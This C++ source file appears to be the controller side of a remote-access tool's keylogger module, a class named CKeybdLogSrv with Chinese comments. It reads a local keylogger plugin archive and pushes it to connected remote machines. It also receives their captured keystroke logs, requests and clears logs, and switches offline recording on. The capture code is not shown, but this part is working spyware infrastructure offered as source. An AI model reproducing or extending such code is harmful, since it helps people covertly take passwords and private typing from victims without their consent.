#include "stdafx.h"
#include "KeybdLogSrv.h"

CKeybdLogSrv::CKeybdLogSrv(CClient*pClient) :
CEventHandler(pClient, KBLG)
{
}


CKeybdLogSrv::~CKeybdLogSrv()
{
}

void CKeybdLogSrv::OnOpen()
{
}

void CKeybdLogSrv::OnClose()
{
}



void CKeybdLogSrv::OnGetPlug(){
	//
	TCHAR plugPath[MAX_PATH];
	GetModuleFileName(GetModuleHandle(0), plugPath, MAX_PATH);
	TCHAR  * p = plugPath + lstrlen(plugPath) - 1;
	while (p >= plugPath && *p != '\\') --p;
	ASSERT(p >= plugPath);
	*p = NULL;

	CString FileName(plugPath);
	FileName += TEXT("\\keylogger\\plug.zip");

	DWORD dwFileSizeLow = NULL;
	LPVOID lpBuffer = NULL;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	DWORD dwRead = 0;

	hFile = CreateFile(FileName, GENERIC_READ, FILE_SHARE_READ, NULL,
		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		::MessageBox(
			NULL, 
			TEXT("CKeybdLogSrv::OnGetPlug CreateFile Failed"),
			TEXT("Error"), 
			MB_OK);

		return;
	}

	dwFileSizeLow = GetFileSize(hFile, NULL);
	lpBuffer = VirtualAlloc(NULL, dwFileSizeLow, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (lpBuffer && ReadFile(hFile, lpBuffer, dwFileSizeLow, &dwRead, NULL) &&
		dwRead == dwFileSizeLow)
	{
		Send(KEYBD_LOG_PLUGS, (char*)lpBuffer, dwRead);
	}
	else
	{
		::MessageBox(
			NULL,
			TEXT("CKeybdLogSrv::OnGetPlug ReadFile Failed"), 
			TEXT("Error"),
			MB_OK);
	}

	if (lpBuffer){
		VirtualFree(lpBuffer, dwFileSizeLow, MEM_RELEASE);
		lpBuffer = NULL;
	}
	CloseHandle(hFile);
}


void CKeybdLogSrv::OnEvent(UINT32 e, BYTE *lpData, UINT32 Size)
{
	switch (e)
	{
	case KEYBD_LOG_ERROR:
		OnLogError((char*)lpData);
		break;
	case KEYBD_LOG_DATA_APPEND:
		OnLogData((char*)lpData, TRUE);
		break;
	case KEYBD_LOG_DATA_NEW:
		OnLogData((char*)lpData, FALSE);
		break;
	case KEYBD_LOG_INITINFO:
		OnLogInit((char*)lpData);
		break;
	case KEYBD_LOG_GETPLUGS:
		OnGetPlug();
		break;
	default:
		break;
	}
}

//数据到来
void CKeybdLogSrv::OnLogData(char*szLog,BOOL Append)
{
	Notify(WM_KEYBD_LOG_DATA, (WPARAM)szLog, Append);
}

//获取日志
void CKeybdLogSrv::GetLogData(){
	Send(KEYBD_LOG_GET_LOG, 0, 0);
}
//离线记录
void CKeybdLogSrv::SetOfflineRecord(BOOL bOfflineRecord)
{
	Send(KEYBD_LOG_SETOFFLINERCD, (char*)&bOfflineRecord, 1);
}

//
void CKeybdLogSrv::OnLogError(char*szError)
{
	Notify(WM_KEYBD_LOG_ERROR, (WPARAM)szError);
	Close();
}

void CKeybdLogSrv::OnLogInit(char*InitInfo)
{
	BYTE bOfflineRecord = InitInfo[0];
	Notify(WM_KEYBD_LOG_INIT, bOfflineRecord);
}

void CKeybdLogSrv::CleanLog()
{
	Send(KEYBD_LOG_CLEAN, 0, 0);
}